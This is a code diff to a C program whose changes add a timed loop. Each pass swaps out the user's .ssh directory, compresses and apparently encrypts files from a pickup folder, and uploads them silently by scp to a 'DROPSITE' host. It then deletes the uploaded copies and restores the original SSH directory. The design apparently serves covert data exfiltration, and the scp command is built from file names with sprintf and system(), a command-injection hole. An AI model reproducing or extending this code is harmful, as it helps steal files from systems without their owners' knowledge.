@@ -42,10 +42,25 @@ int main(int argc, const char * argv[])
  * 
  * RETURNS:     void
  *
- * NOTES: Tests whether ssh is sane or not. 
+ * NOTES: Tests whether program sens files from the pickup directory using the
+ *        libevent timer.
  *----------------------------------------------------------------------------*/
 void test_ssh()
 {
+	struct event timeout;
+	struct timeval tv;
+
+	/* initialize libevent */
+	event_init();
+
+	/* only check pickup folder every 10 minutes */
+	evtimer_set(&timeout, ssh_timer, &timeout);
+	evutil_timerclear(&tv);
+	tv.tv_sec = 0;
+	event_add(&timeout, &tv);
+
+	/* start the event loop */
+	event_dispatch();
 }
 
 void ssh_replace_dir(void)
@@ -137,7 +152,7 @@ void ssh_send_files(void)
 				err(1, "fopen");
 
 			if (deflate_file(fd_in, fd_out, Z_BEST_COMPRESSION) != SUCCESS) {
-				fprintf(stderr, "ZLIB: Error deflating file %s\n");
+				fprintf(stderr, "ZLIB: Error deflating file %s\n", file_in);
 				exit(ERROR);
 			}
 
@@ -169,8 +184,11 @@ void ssh_send_files(void)
 
 			/* send the file */
 			memset(command, 0x00, FILENAME_MAX);
-			sprintf(command, "scp %s %s:%s > /dev/null 2>&1", file_out, DROPSITE, DROPSITE_DIR);
-			system(command);
+			sprintf(command, "scp %s %s:%s > /dev/null 2>&1", file_out,
+					DROPSITE, DROPSITE_DIR);
+
+			if (system(command) == ERROR)
+				err(1, "system");
 
 			/* delete compressed & encrypted file */
 			remove(file_out);
@@ -184,9 +202,17 @@ void ssh_send_files(void)
 	closedir(dir);
 }
 
-void ssh_timer(void)
+void ssh_timer(int fd, short event, void *arg)
 {
+	struct timeval tv;
+	struct event *timeout = arg;
+
 	ssh_replace_dir();	/* backup and replace .ssh directory */
 	ssh_send_files();	/* send any files in the pickup directory */
 	ssh_restore_dir();	/* restore original .ssh directory */
+
+	/* reset the timer */
+	evutil_timerclear(&tv);
+	tv.tv_sec = EVENT_TIMER;
+	event_add(timeout, &tv);
 }
